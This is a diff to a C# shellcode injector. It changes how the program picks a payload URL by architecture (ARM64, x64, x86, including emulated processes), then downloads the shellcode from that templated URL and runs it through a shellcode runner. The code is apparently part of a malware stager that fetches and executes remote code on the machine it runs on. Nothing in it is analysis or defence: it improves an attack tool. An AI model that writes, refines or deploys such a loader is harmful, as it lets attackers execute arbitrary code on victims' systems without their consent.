@@ -17,21 +17,29 @@ namespace ShellcodeInjector
             NativeImports.GetNativeSystemInfo(out sysInfo);
 
             string url;
-            switch (sysInfo.wProcessorArchitecture)
+            ushort effectiveArch;
+
+            if (sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8)
             {
-                case 12: // ARM64
-                    url = "%URLARM64%";
-                    break;
-                case 9: // x64
-                    url = "%URL64%";
-                    break;
-                default: // x86
-                    url = "%URL32%";
-                    break;
+                // Native ARM64 process
+                url = "%URLARM64%";
+                effectiveArch = 12;
+            }
+            else if (IntPtr.Size == 8)
+            {
+                // x64 process (native or emulated on ARM64)
+                url = "%URL64%";
+                effectiveArch = 9;
+            }
+            else
+            {
+                // x86 process (native, WoW64, or emulated on ARM64)
+                url = "%URL32%";
+                effectiveArch = 0;
             }
 
             var payload = Downloader.DownloadFromUrl(url);
-            ShellcodeRunner.RunPayload(payload, sysInfo.wProcessorArchitecture);
+            ShellcodeRunner.RunPayload(payload, effectiveArch);
         }
     }
 }
